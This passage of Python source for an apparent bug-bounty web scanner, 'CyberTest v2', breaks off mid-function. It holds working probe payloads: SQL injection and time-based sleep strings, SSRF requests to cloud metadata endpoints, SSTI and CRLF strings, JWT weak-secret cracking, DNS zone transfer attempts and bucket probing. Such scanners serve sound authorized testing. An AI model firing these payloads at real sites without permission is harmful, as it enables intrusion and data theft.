"""CyberTest v2 — Advanced Bug Bounty & Ethical Hacking Engine for Flashy CLI.

Usage: /cybertest <url>

!! FOR AUTHORIZED TESTING ONLY — ONLY SCAN SITES YOU OWN OR HAVE WRITTEN PERMISSION TO TEST !!

Real-world bug bounty techniques (OWASP Top 10 + HackerOne/Bugcrowd patterns):

  [RECON]
  1.  DNS deep recon   — A/AAAA/MX/TXT/NS/CNAME/SOA + zone transfer attempt
  2.  Subdomain enum   — crt.sh certificate transparency + wordlist bruteforce
  3.  Cloud assets     — S3/GCS/Azure bucket detection, Cloudflare bypass
  4.  Email security   — SPF/DKIM/DMARC analysis (phishing vector)
  5.  Wayback/archive  — Historical endpoint discovery via archive.org API
  6.  Tech stack       — Deep fingerprinting (CMS, framework, WAF, CDN)

  [AUTH & SESSION]
  7.  JWT attacks      — alg:none, weak secret, expired token acceptance
  8.  Auth bypass      — default creds, admin path 401->200, HTTP method bypass
  9.  Session fixation — pre-auth session ID reuse
  10. Rate limiting    — login/reset endpoint brute-force protection check
  11. Password reset   — host header poisoning on reset flows

  [INJECTION]
  12. SQLi advanced    — error-based, time-based blind (sleep/pg_sleep/benchmark)
  13. SSRF             — internal host probing via URL params (169.254.x, 127.x)
  14. SSTI             — template injection (Jinja2/Twig/Freemarker payloads)
  15. Command inject   — shell metacharacter injection in params
  16. XXE              — XML external entity in upload/POST endpoints
  17. CRLF inject      — header injection via newline chars in params
  18. Open redirect     — comprehensive param fuzzing (30+ params)

  [BROKEN ACCESS CONTROL]
  19. IDOR hints       — sequential ID parameter enumeration patterns
  20. Path traversal   — LFI with null bytes, encoded variants, PHP wrappers
  21. Privilege escalation — role param tampering (admin=true, role=admin)

  [API SECURITY]
  22. GraphQL          — introspection enabled, batch query abuse, field suggest
  23. REST API         — mass assignment, excessive data exposure, verb tampering
  24. API versioning   — v0/v-1/internal/debug endpoint enumeration

  [WEB ATTACKS]
  25. XSS advanced     — reflected, DOM sinks, polyglot payloads, event handlers
  26. Host header      — SSRF via Host, X-Forwarded-Host cache poisoning
  27. Cache poisoning  — unkeyed header injection (X-Forwarded-Host, X-Original-URL)
  28. Clickjacking     — nested frame + CSP frame-ancestors bypass check
  29. CORS deep        — wildcard+credentials, null origin, pre-flight bypass
  30. HTTP smuggling   — CL.TE / TE.CL timing probe (non-destructive)

  [INFRASTRUCTURE]
  31. Port scan        — 65 common ports including internal services
  32. SSL/TLS deep     — weak ciphers, BEAST, POODLE, Heartbleed-era checks
  33. Security headers — full Mozilla Observatory grade audit
  34. Info disclosure  — source comments, API keys in body, stack traces, debug

  [SUMMARY]
  35. CVSS-style score — severity-weighted risk score + prioritized remediation
"""
from __future__ import annotations

import asyncio
import base64
import concurrent.futures
import hashlib
import hmac
import ipaddress
import json
import os
import re
import socket
import ssl
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

# ─── Optional deps ────────────────────────────────────────────────────────────
try:
    import requests
    import requests.exceptions
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

try:
    import aiohttp
    AIOHTTP_OK = True
except ImportError:
    AIOHTTP_OK = False

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    from rich.rule import Rule
    from rich.columns import Columns
    from rich.text import Text
    RICH_OK = True
except ImportError:
    RICH_OK = False


# ═══════════════════════════════════════════════════════════════════════════════
# Finding / Result model
# ═══════════════════════════════════════════════════════════════════════════════

SEV = dict(
    CRITICAL=0, HIGH=1, MEDIUM=2, LOW=3, INFO=4, OK=5
)
SEV_COLOR = {
    "CRITICAL": "bold red",
    "HIGH":     "red",
    "MEDIUM":   "yellow",
    "LOW":      "cyan",
    "INFO":     "dim white",
    "OK":       "green",
}
SEV_BADGE = {
    "CRITICAL": "[bold red] CRIT [/bold red]",
    "HIGH":     "[red] HIGH [/red]",
    "MEDIUM":   "[yellow] MED  [/yellow]",
    "LOW":      "[cyan] LOW  [/cyan]",
    "INFO":     "[dim] INFO [/dim]",
    "OK":       "[green]  OK  [/green]",
}
# CVSS-like numeric weight for risk score
SEV_WEIGHT = {"CRITICAL": 10.0, "HIGH": 7.5, "MEDIUM": 4.0, "LOW": 1.5, "INFO": 0.0, "OK": 0.0}

CVSS_GRADE = [
    (9.0, "A+ CRITICAL — Immediate action required"),
    (7.0, "B  HIGH — Fix before next release"),
    (4.0, "C  MEDIUM — Fix within sprint"),
    (1.0, "D  LOW — Fix when possible"),
    (0.0, "E  INFO — Informational"),
]


@dataclass
class Finding:
    module: str
    severity: str
    title: str
    detail: str = ""
    evidence: str = ""
    remediation: str = ""
    cve: str = ""
    cwe: str = ""
    bounty_hint: str = ""


@dataclass
class ScanResult:
    target: str
    started_at: float = field(default_factory=time.time)
    finished_at: float = 0.0
    findings: List[Finding] = field(default_factory=list)
    meta: Dict[str, Any] = field(default_factory=dict)

    def add(self, module: str, severity: str, title: str, **kw) -> None:
        self.findings.append(Finding(module=module, severity=severity, title=title, **kw))

    def by_severity(self) -> List[Finding]:
        return sorted(self.findings, key=lambda f: SEV.get(f.severity, 9))

    def counts(self) -> Dict[str, int]:
        out: Dict[str, int] = {}
        for f in self.findings:
            out[f.severity] = out.get(f.severity, 0) + 1
        return out

    def risk_score(self) -> float:
        return min(10.0, sum(SEV_WEIGHT.get(f.severity, 0) for f in self.findings) / max(1, len(self.findings)) * 3)

    @property
    def elapsed(self) -> float:
        return (self.finished_at or time.time()) - self.started_at

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "elapsed_s": round(self.elapsed, 1),
            "risk_score": round(self.risk_score(), 1),
            "findings": [
                {
                    "module": f.module,
                    "severity": f.severity,
                    "title": f.title,
                    "detail": f.detail,
                    "evidence": f.evidence,
                    "remediation": f.remediation,
                    "cwe": f.cwe,
                    "bounty_hint": f.bounty_hint,
                }
                for f in self.findings
            ],
        }

    def to_json(self, indent: int = 2) -> str:
        import json
        return json.dumps(self.to_dict(), indent=indent)


# ═══════════════════════════════════════════════════════════════════════════════
# HTTP helpers
# ═══════════════════════════════════════════════════════════════════════════════

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
BASE_HEADERS = {
    "User-Agent": UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}
TIMEOUT = 10
SHORT_TIMEOUT = 3


def req(method: str, url: str, *, timeout: int = TIMEOUT,
        extra_headers: Optional[Dict] = None,
        allow_redirects: bool = True,
        verify: bool = False,
        data: Any = None,
        json_body: Any = None,
        params: Any = None,
        use_cache: bool = True) -> Optional[Any]:
    if not REQUESTS_OK:
        return None
    cache_key = f"{method}:{url}"
    if use_cache and cache_key in _response_cache:
        return _response_cache[cache_key]
    _rate_limit()
    try:
        h = dict(BASE_HEADERS)
        if extra_headers:
            h.update(extra_headers)
        import warnings
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            resp = requests.request(
                method, url, headers=h, timeout=timeout,
                allow_redirects=allow_redirects,
                verify=verify, data=data, json=json_body, params=params
            )
        if use_cache:
            _response_cache[cache_key] = resp
        return resp
    except Exception:
        return None


def get(url: str, **kw) -> Optional[Any]:
    return req("GET", url, **kw)

def post(url: str, **kw) -> Optional[Any]:
    return req("POST", url, **kw)

def options_req(url: str, **kw) -> Optional[Any]:
    return req("OPTIONS", url, **kw)

def _body(r) -> str:
    try:
        return r.text or ""
    except Exception:
        return ""

def _hdrs(r) -> Dict[str, str]:
    try:
        return {k.lower(): v for k, v in r.headers.items()}
    except Exception:
        return {}


# ─── Shared response cache + rate limiter ──────────────────────────────────────
_response_cache: Dict[str, Any] = {}
_last_req_time: float = 0.0

_PARALLEL_WORKERS: int = 1  # sequential by default — override via env CYBERTEST_WORKERS

def _rate_limit() -> None:
    """Ensure at least 500ms between HTTP requests to avoid overwhelming
    the target or tripping WAF rate limits."""
    global _last_req_time
    now = time.time()
    if _last_req_time:
        elapsed = now - _last_req_time
        if elapsed < 0.5:
            time.sleep(0.5 - elapsed)
    _last_req_time = time.time()

def clear_cache() -> None:
    _response_cache.clear()


# ═══════════════════════════════════════════════════════════════════════════════
# 1. Deep DNS Recon
# ═══════════════════════════════════════════════════════════════════════════════

class DNSReconScanner:
    """A/AAAA/MX/TXT/NS/CNAME/SOA + zone transfer + email security."""

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        host = parsed.hostname or ""
        res.meta["host"] = host

        # Basic IP resolution
        try:
            ip = socket.gethostbyname(host)
            res.meta["ip"] = ip
            res.add("DNS Recon", "INFO", f"A record: {host} -> {ip}")
        except socket.gaierror:
            res.add("DNS Recon", "HIGH", f"DNS resolution failed for {host}",
                    remediation="Verify domain is correctly configured.")
            return

        # Reverse DNS
        try:
            rdns = socket.gethostbyaddr(ip)[0]
            res.add("DNS Recon", "INFO", f"rDNS: {ip} -> {rdns}")
        except Exception:
            res.add("DNS Recon", "INFO", "No reverse DNS entry")

        # Try dnspython if available for full record types
        try:
            import dns.resolver
            import dns.query
            import dns.zone
            import dns.exception

            resolver = dns.resolver.Resolver()
            resolver.timeout = 3
            resolver.lifetime = 5

            for rtype in ("MX", "TXT", "NS", "CNAME", "AAAA"):
                try:
                    answers = resolver.resolve(host, rtype)
                    vals = [str(r) for r in answers]
                    res.add("DNS Recon", "INFO", f"{rtype} records: {', '.join(vals[:3])}")
                    # SPF check
                    if rtype == "TXT":
                        spf_found = any("v=spf1" in v.lower() for v in vals)
                        dmarc_vals = []
                        try:
                            d = resolver.resolve(f"_dmarc.{host}", "TXT")
                            dmarc_vals = [str(r) for r in d]
                        except Exception:
                            pass
                        if not spf_found:
                            res.add("DNS Recon", "MEDIUM", "No SPF record found",
                                    detail="Attackers can spoof email from your domain.",
                                    remediation="Add SPF TXT record: v=spf1 include:yourmailprovider.com ~all",
                                    cwe="CWE-345")
                        else:
                            res.add("DNS Recon", "OK", "SPF record present")
                        if not dmarc_vals:
                            res.add("DNS Recon", "MEDIUM", "No DMARC record (_dmarc) found",
                                    remediation='Add _dmarc TXT: v=DMARC1; p=reject; rua=mailto:dmarc@yourdomain.com',
                                    cwe="CWE-345")
                        else:
                            pol = next((v for v in dmarc_vals if "p=" in v.lower()), "")
                            if "p=none" in pol.lower():
                                res.add("DNS Recon", "LOW", "DMARC policy is 'none' (monitoring only)",
                                        remediation="Upgrade to p=quarantine or p=reject.")
                            else:
                                res.add("DNS Recon", "OK", f"DMARC present: {pol[:60]}")
                except Exception:
                    pass

            # Zone transfer attempt (AXFR)
            try:
                ns_answers = resolver.resolve(host, "NS")
                for ns in ns_answers:
                    ns_host = str(ns).rstrip(".")
                    try:
                        zone = dns.zone.from_xfr(dns.query.xfr(ns_host, host, timeout=3))
                        names = [str(n) for n in zone.nodes.keys()]
                        res.add("DNS Recon", "CRITICAL",
                                f"DNS Zone Transfer (AXFR) ALLOWED on {ns_host}!",
                                detail=f"Exposed {len(names)} records. First 10: {names[:10]}",
                                evidence=f"AXFR query to {ns_host} for zone {host} succeeded.",
                                remediation="Restrict zone transfers to authorized secondary nameservers only.",
                                cwe="CWE-200",
                                bounty_hint="Zone transfer is typically a HIGH/CRITICAL bug bounty finding.")
                        break
                    except Exception:
                        pass
            except Exception:
                pass

        except ImportError:
            # dnspython not installed — do basic checks only
            res.add("DNS Recon", "INFO", "Install dnspython for full DNS recon: pip install dnspython")
            # Check email security via TXT record patterns in HTTP response
            resp = get(f"https://dns.google/resolve?name={host}&type=TXT")
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    txts = [r.get("data", "") for r in data.get("Answer", [])]
                    if not any("v=spf1" in t for t in txts):
                        res.add("DNS Recon", "MEDIUM", "SPF record not found (via Google DNS API)",
                                remediation="Add SPF TXT record to prevent email spoofing.")
                except Exception:
                    pass


# ═══════════════════════════════════════════════════════════════════════════════
# 2. Subdomain Enumeration
# ═══════════════════════════════════════════════════════════════════════════════

class SubdomainScanner:
    """crt.sh certificate transparency + wordlist bruteforce."""

    WORDLIST = [
        "www", "mail", "ftp", "api", "dev", "staging", "test", "admin", "portal",
        "app", "mobile", "m", "cdn", "static", "assets", "media", "img", "images",
        "blog", "shop", "store", "support", "help", "docs", "wiki", "status",
        "beta", "alpha", "demo", "sandbox", "uat", "qa", "prod", "internal",
        "vpn", "remote", "ssh", "git", "gitlab", "github", "jenkins", "jira",
        "confluence", "grafana", "kibana", "elastic", "redis", "db", "database",
        "mysql", "postgres", "mongo", "smtp", "webmail", "email", "mx",
        "old", "backup", "legacy", "new", "v2", "api2", "api-v2",
    ]

    TAKEOVER_PATTERNS = {
        "github.io":             "GitHub Pages",
        "herokuapp.com":         "Heroku",
        "s3.amazonaws.com":      "AWS S3",
        "azurewebsites.net":     "Azure",
        "cloudapp.net":          "Azure",
        "amazonaws.com":         "AWS",
        "fastly.net":            "Fastly",
        "zendesk.com":           "Zendesk",
        "shopify.com":           "Shopify",
        "squarespace.com":       "Squarespace",
        "cargo.site":            "Cargo",
        "ghost.io":              "Ghost",
        "surge.sh":              "Surge",
        "netlify.app":           "Netlify",
        "pages.dev":             "Cloudflare Pages",
    }

    DANGLING_MSGS = [
        "there isn't a github pages site here",
        "heroku | no such app",
        "the specified bucket does not exist",
        "nxdomain",
        "no such account",
        "project not found",
        "404 not found",
        "domain not configured",
        "this site can't be reached",
    ]

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        host = parsed.hostname or ""
        # Strip www
        base = re.sub(r"^www\.", "", host)

        found: List[str] = []

        # ── crt.sh certificate transparency ─────────────────────────────────
        r = get(f"https://crt.sh/?q=%.{base}&output=json", timeout=15)
        if r and r.status_code == 200:
            try:
                data = r.json()
                subs: Set[str] = set()
                for entry in data:
                    cn = entry.get("common_name", "")
                    if cn.endswith(f".{base}") or cn == base:
                        clean = cn.lstrip("*.")
                        subs.add(clean)
                    # name_value can contain multiple SANs
                    for name in entry.get("name_value", "").split("\n"):
                        name = name.strip().lstrip("*.")
                        if name.endswith(f".{base}") and name != host:
                            subs.add(name)
                if subs:
                    res.add("Subdomains", "INFO",
                            f"crt.sh found {len(subs)} subdomains",
                            detail=", ".join(sorted(subs)[:20]) + ("..." if len(subs) > 20 else ""),
                            bounty_hint="Check each subdomain for takeover, exposed admin panels, staging data.")
                    found.extend(list(subs)[:30])
            except Exception:
                pass

        # ── Wordlist bruteforce DNS ──────────────────────────────────────────
        resolved: List[str] = []
        for sub in self.WORDLIST:
            fqdn = f"{sub}.{base}"
            if fqdn in found:
                continue
            try:
                socket.setdefaulttimeout(1)
                ip = socket.gethostbyname(fqdn)
                resolved.append(fqdn)
                found.append(fqdn)
                res.add("Subdomains", "INFO", f"Subdomain resolved: {fqdn} -> {ip}")
            except Exception:
                pass
        socket.setdefaulttimeout(None)

        if resolved:
            res.add("Subdomains", "LOW",
                    f"Discovered {len(resolved)} live subdomains via bruteforce",
                    detail=", ".join(resolved[:15]),
                    bounty_hint="Each live subdomain is an attack surface. Check for misconfigurations.")

        # ── Subdomain takeover check ─────────────────────────────────────────
        for fqdn in found[:20]:
            try:
                r2 = get(f"https://{fqdn}", timeout=SHORT_TIMEOUT)
                if r2 is None:
                    # DNS resolves but HTTP fails — possible dangling CNAME
                    try:
                        cname = socket.getfqdn(fqdn)
                        for svc_domain, svc_name in self.TAKEOVER_PATTERNS.items():
                            if svc_domain in cname:
                                res.add("Subdomains", "HIGH",
                                        f"Possible subdomain takeover: {fqdn}",
                                        detail=f"CNAME points to {svc_name} ({cname}) but not claimed.",
                                        evidence=f"DNS resolves {fqdn} -> CNAME {cname}, HTTP unreachable.",
                                        remediation="Claim the asset on the target platform or remove the DNS record.",
                                        cwe="CWE-290",
                                        bounty_hint="Subdomain takeover is typically HIGH/CRITICAL on bug bounty programs.")
                    except Exception:
                        pass
                elif r2.status_code in (200, 404):
                    body_l = _body(r2).lower()
                    for dangling_msg in self.DANGLING_MSGS:
                        if dangling_msg in body_l:
                            res.add("Subdomains", "CRITICAL",
                                    f"Subdomain TAKEOVER confirmed: {fqdn}",
                                    detail=f"Response contains takeover indicator: '{dangling_msg}'",
                                    evidence=f"GET https://{fqdn} -> {r2.status_code}, body contains '{dangling_msg}'",
                                    remediation="Immediately claim or remove this DNS record.",
                                    cwe="CWE-290",
                                    bounty_hint="CRITICAL bug bounty finding — report immediately.")
                            break
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════════════════════
# 3. Cloud Asset Detection
# ═══════════════════════════════════════════════════════════════════════════════

class CloudScanner:
    """S3 bucket exposure, Azure blob, GCS, Cloudflare origin IP bypass."""

    S3_PERMUTATIONS = [
        "{domain}", "{domain}-backup", "{domain}-assets", "{domain}-static",
        "{domain}-media", "{domain}-uploads", "{domain}-files",
        "{base}", "{base}-backup", "{base}-dev", "{base}-prod",
    ]

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        host = parsed.hostname or ""
        base = re.sub(r"^www\.", "", host).split(".")[0]
        domain = host.replace(".", "-")

        # ── S3 bucket probing ────────────────────────────────────────────────
        buckets_to_try = [
            t.format(domain=domain, base=base)
            for t in self.S3_PERMUTATIONS
        ]

        for bucket in buckets_to_try:
            for s3_url in [
                f"https://{bucket}.s3.amazonaws.com",
                f"https://s3.amazonaws.com/{bucket}",
            ]:
                r = get(s3_url, timeout=SHORT_TIMEOUT)
                if r is None:
                    continue
                if r.status_code == 200:
                    body = _body(r)
                    if "<ListBucketResult" in body or "<?xml" in body.lower():
                        res.add("Cloud", "CRITICAL",
                                f"AWS S3 bucket publicly listable: {bucket}",
                                detail=f"URL: {s3_url}",
                                evidence=f"GET {s3_url} -> 200 + ListBucketResult XML",
                                remediation="Disable public access block on S3 bucket. Set bucket policy to deny public GetObject/ListBucket.",
                                cwe="CWE-284",
                                bounty_hint="Public S3 bucket listing is CRITICAL — often leads to credential exposure.")
                    else:
                        res.add("Cloud", "HIGH",
                                f"AWS S3 bucket accessible: {bucket}",
                                detail=f"Returns 200 but may not be listable.",
                                evidence=f"GET {s3_url} -> 200",
                                remediation="Review S3 bucket permissions.")
                    break
                elif r.status_code == 403:
                    res.add("Cloud", "LOW",
                            f"S3 bucket exists but access denied: {bucket}",
                            detail="Bucket is private but its existence is confirmed.",
                            bounty_hint="Check if files are directly guessable even if listing is disabled.")
                    break

        # ── Cloudflare real IP bypass ────────────────────────────────────────
        resp = get(result_target := parsed.geturl())
        if resp:
            hdrs = _hdrs(resp)
            cf_ray = hdrs.get("cf-ray", "")
            if cf_ray:
                res.add("Cloud", "INFO", "Cloudflare CDN detected",
                        detail=f"CF-Ray: {cf_ray}",
                        bounty_hint="Try to find origin IP via: Shodan/Censys historical DNS, SecurityTrails, old MX records, or direct IP scan. Bypassing Cloudflare WAF is a common finding.")

        # ── Azure Blob ───────────────────────────────────────────────────────
        base_simple = re.sub(r"[^a-z0-9]", "", base.lower())
        for azure_url in [
            f"https://{base_simple}.blob.core.windows.net",
            f"https://{base_simple}.azurewebsites.net",
        ]:
            r = get(azure_url, timeout=SHORT_TIMEOUT)
            if r and r.status_code in (200, 400, 409):
                res.add("Cloud", "MEDIUM",
                        f"Azure asset found: {azure_url}",
                        detail=f"HTTP {r.status_code}",
                        bounty_hint="Check for public blob storage or Azure misconfiguration.")


# ═══════════════════════════════════════════════════════════════════════════════
# 4. JWT Attack Surface
# ═══════════════════════════════════════════════════════════════════════════════

class JWTScanner:
    """alg:none attack, weak secret brute-force, expired token acceptance."""

    WEAK_SECRETS = [
        "secret", "password", "123456", "admin", "key", "jwt", "token",
        "private", "changeme", "qwerty", "letmein", "master", "default",
        "development", "test", "demo", "secret123", "supersecret",
    ]

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        base = f"{parsed.scheme}://{parsed.netloc}"

        # ── Find JWT in cookies / localStorage hints ─────────────────────────
        resp = get(base)
        if not resp:
            return

        hdrs = _hdrs(resp)
        jwt_tokens: List[str] = []

        # Check Set-Cookie headers for JWTs
        for header_val in resp.headers.getlist("Set-Cookie") if hasattr(resp.headers, "getlist") else [resp.headers.get("Set-Cookie", "")]:
            for part in header_val.split(";"):
                val = part.strip().split("=", 1)[-1].strip()
                if self._is_jwt(val):
                    jwt_tokens.append(val)

        # Check auth-related response headers
        for hname in ("authorization", "x-auth-token", "x-access-token", "token"):
            val = hdrs.get(hname, "")
            if self._is_jwt(val.replace("Bearer ", "")):
                jwt_tokens.append(val.replace("Bearer ", ""))

        # Check body for JWT patterns
        body = _body(resp)
        body_jwts = re.findall(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', body)
        jwt_tokens.extend(body_jwts[:3])

        if not jwt_tokens:
            # Try common login/auth endpoints
            for path in ["/login", "/api/login", "/api/auth", "/api/token", "/auth"]:
                r2 = post(f"{base}{path}", json_body={"username": "test", "password": "test"}, timeout=SHORT_TIMEOUT)
                if r2:
                    body2 = _body(r2)
                    found = re.findall(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', body2)
                    jwt_tokens.extend(found[:2])
                    if found:
                        break

        if not jwt_tokens:
            res.add("JWT", "INFO", "No JWT tokens found in initial requests")
            return

        for token in jwt_tokens[:3]:
            res.add("JWT", "INFO", f"JWT token found: {token[:40]}...")
            issues = self._analyze_jwt(token)
            for sev, title, detail, rem, hint in issues:
                res.add("JWT", sev, title, detail=detail, remediation=rem, bounty_hint=hint,
                        cwe="CWE-347")

    def _is_jwt(self, val: str) -> bool:
        parts = val.split(".")
        return len(parts) == 3 and all(len(p) > 0 for p in parts) and val.startswith("eyJ")

    def _analyze_jwt(self, token: str) -> List[Tuple]:
        issues = []
        try:
            parts = token.split(".")
            header_raw = parts[0] + "=" * (4 - len(parts[0]) % 4)
            payload_raw = parts[1] + "=" * (4 - len(parts[1]) % 4)
            header = json.loads(base64.b64decode(header_raw).decode("utf-8", errors="ignore"))
            payload = json.loads(base64.b64decode(payload_raw).decode("utf-8", errors="ignore"))

            alg = header.get("alg", "").upper()

            # alg:none attack
            if alg == "NONE":
                issues.append(("CRITICAL", "JWT alg:none — signature bypass!",
                               "Algorithm is 'none' — no signature verification.",
                               "Enforce HS256/RS256. Reject tokens with alg:none.",
                               "CRITICAL bug bounty finding — full auth bypass."))
            elif alg in ("HS256", "HS384", "HS512"):
                # Weak secret brute-force
                for secret in self.WEAK_SECRETS:
                    if self._verify_hmac(parts[0] + "." + parts[1], parts[2], secret, alg):
                        issues.append(("CRITICAL", f"JWT weak secret cracked: '{secret}'",
                                       f"HMAC secret is trivially guessable: '{secret}'",
                                       "Use a cryptographically random secret (>= 256 bits).",
                                       "Full authentication bypass — CRITICAL bounty."))
                        break

                # Try RS256->HS256 confusion
                issues.append(("LOW", "JWT uses symmetric HMAC (HS256)",
                               "If server also accepts RS256 public key as HS256 secret, algorithm confusion attack is possible.",
                               "Use RS256 with proper key management.",
                               "Algorithm confusion attack — check if RS256 public key used as HS256 secret."))

            # Expiry check
            exp = payload.get("exp", 0)
            if exp:
                exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc)
                days_left = (exp_dt - datetime.now(timezone.utc)).days
                if days_left < 0:
                    issues.append(("MEDIUM", f"JWT expired {abs(days_left)} days ago",
                                   "Expired tokens should be rejected. Test if server still accepts them.",
                                   "Validate exp claim server-side.",
                                   "If server accepts expired tokens, that's a HIGH bug."))
                elif days_left > 365:
                    issues.append(("LOW", f"JWT has very long expiry: {days_left} days",
                                   "Long-lived tokens increase the impact of token theft.",
                                   "Use short-lived access tokens (15min-1hr) with refresh tokens."))

            # Sensitive data in payload
            sensitive_keys = ["password", "secret", "ssn", "card", "cvv", "pin", "private"]
            for key in payload:
                if any(sk in key.lower() for sk in sensitive_keys):
                    issues.append(("HIGH", f"Sensitive data in JWT payload: '{key}'",
                                   f"JWT payload (base64, not encrypted) contains '{key}': {str(payload[key])[:30]}",
                                   "Never store sensitive data in JWT. Use opaque session tokens or encrypt the payload (JWE).",
                                   "Data exposure finding."))

        except Exception:
            pass
        return issues

    def _verify_hmac(self, data: str, sig_b64: str, secret: str, alg: str) -> bool:
        try:
            alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
            h = hmac.new(secret.encode(), data.encode(), alg_map.get(alg, hashlib.sha256))
            expected = base64.urlsafe_b64encode(h.digest()).rstrip(b"=").decode()
            return hmac.compare_digest(expected, sig_b64)
        except Exception:
            return False


# ═══════════════════════════════════════════════════════════════════════════════
# 5. Advanced Injection Testing
# ═══════════════════════════════════════════════════════════════════════════════

class InjectionScanner:
    """SQLi (error+blind), SSRF, SSTI, Command injection, CRLF."""

    # ── SQLi ─────────────────────────────────────────────────────────────────
    SQLI_ERROR_PAYLOADS = ["'", '"', "1'", "1\"", "' OR 1=1--", "' OR '1'='1", "\\"]
    SQLI_ERRORS = [
        "sql syntax", "mysql_fetch", "warning: mysql", "pg::", "sqlite",
        "unterminated string", "quoted string not properly terminated",
        "unclosed quotation mark", "syntax error", "odbc driver",
        "microsoft ole db", "jdbc", "ora-", "invalid column name",
        "conversion failed", "supplied argument is not a valid mysql",
        "you have an error in your sql",
    ]

    # Time-based SQLi payloads (each adds a 3s delay if vulnerable)
    SQLI_TIME_PAYLOADS = [
        ("MySQL",      "' AND SLEEP(3)--",             3.0),
        ("MySQL",      "1 AND SLEEP(3)--",             3.0),
        ("PostgreSQL", "'; SELECT pg_sleep(3)--",      3.0),
        ("MSSQL",      "'; WAITFOR DELAY '0:0:3'--",   3.0),
        ("Oracle",     "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", 3.0),
        ("SQLite",     "' AND randomblob(500000000/1)--", 2.0),
    ]

    # ── SSRF ─────────────────────────────────────────────────────────────────
    SSRF_PARAMS = ["url", "path", "redirect", "next", "src", "href", "img",
                   "uri", "endpoint", "fetch", "proxy", "load", "remote", "dest"]
    SSRF_PROBES = [
        ("http://127.0.0.1",              "localhost redirect"),
        ("http://169.254.169.254/latest/meta-data/",  "AWS metadata"),
        ("http://metadata.google.internal/", "GCP metadata"),
        ("http://169.254.169.254/metadata/v1/", "Azure metadata"),
        ("http://[::1]",                  "IPv6 localhost"),
        ("http://0.0.0.0",                "Null host"),
        ("http://0177.0.0.1",             "Octal encoded localhost"),
        ("http://2130706433",             "Decimal encoded localhost"),
    ]
    SSRF_SUCCESS = ["ami-id", "instance-id", "local-ipv4", "computeMetadata",
                    "metadata", "root:x", "127.0.0.1", "localhost", "169.254"]

    # ── SSTI ─────────────────────────────────────────────────────────────────
    SSTI_PAYLOADS = [
        ("{{7*7}}",            "49",    "Jinja2/Twig/Django"),
        ("${7*7}",             "49",    "FreeMarker/Velocity"),
        ("#{7*7}",             "49",    "Pebble/Thymeleaf"),
        ("{{7*'7'}}",          "7777777", "Jinja2 specific"),
        ("<%= 7*7 %>",         "49",    "ERB/EJS"),
        ("{7*7}",              "49",    "Smarty"),
        ("*{7*7}",             "49",    "Spring SpEL"),
    ]

    # ── CRLF ─────────────────────────────────────────────────────────────────
    CRLF_PAYLOADS = [
        "%0d%0aX-Injected: crlf-test",
        "%0aX-Injected: crlf-test",
        "\r\nX-Injected: crlf-test",
        "%0d%0a%20X-Injected: crlf-test",
    ]

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"
        self._test_sqli(res, base, path)
        self._test_ssrf(res, base, path)
        self._test_ssti(res, base, path)
        self._test_crlf(res, base, path)
        self._test_cmdi(res, base, path)

    def _test_sqli(self, res: ScanResult, base: str, path: str) -> None:
        # Error-based
        for pl in self.SQLI_ERROR_PAYLOADS[:3]:
            for param in ["id", "q", "search", "item", "page", "cat", "user"]:
                r = get(f"{base}{path}", params={param: pl})
                if r:
                    body_l = _body(r).lower()
                    for err in self.SQLI_ERRORS:
                        if err in body_l:
                            # FALSE-POSITIVE VERIFICATION: send neutral input
                            # to distinguish real SQLi from a generic error page.
                            neutral = get(f"{base}{path}", params={param: "test123"})
                            neutral_body = _body(neutral).lower() if neutral else ""
                            if neutral_body and err in neutral_body:
                                res.add("Injection", "LOW",
                                        f"Error triggered by ?{param}= (generic, not SQLi)",
                                        detail=f"Same error '{err}' appears with neutral 'test123'. Likely a static error page.",
                                        evidence=f"Both sqli and neutral params produce same error",
                                        cwe="CWE-89")
                            else:
                                res.add("Injection", "CRITICAL",
                                        f"SQL Injection (error-based) via ?{param}=",
                                        detail=f"DB error leaked. Payload: {pl!r}, Error: '{err}'",
                                        evidence=f"GET ?{param}={pl} -> DB error in response body",
                                        remediation="Use parameterized queries / prepared statements. NEVER interpolate user input in SQL.",
                                        cwe="CWE-89",
                                        bounty_hint="SQLi is CRITICAL on almost all programs. Full DB read/write possible.")
                            return

        # Time-based blind SQLi
        baseline_r = get(f"{base}{path}", params={"id": "1"})
        baseline_time = 1.0
        if baseline_r:
            baseline_time = baseline_r.elapsed.total_seconds() if hasattr(baseline_r, "elapsed") else 1.0

        for db_name, pl, expected_delay in self.SQLI_TIME_PAYLOADS:
            start = time.time()
            r = get(f"{base}{path}", params={"id": pl}, timeout=int(expected_delay) + 5)
            elapsed = time.time() - start
            if elapsed >= expected_delay + baseline_time - 0.5:
                res.add("Injection", "CRITICAL",
                        f"Blind SQL Injection (time-based) — {db_name}",
                        detail=f"Response delayed {elapsed:.1f}s (expected {expected_delay}s baseline {baseline_time:.1f}s). Payload: {pl!r}",
                        evidence=f"GET ?id={pl} -> {elapsed:.1f}s response time",
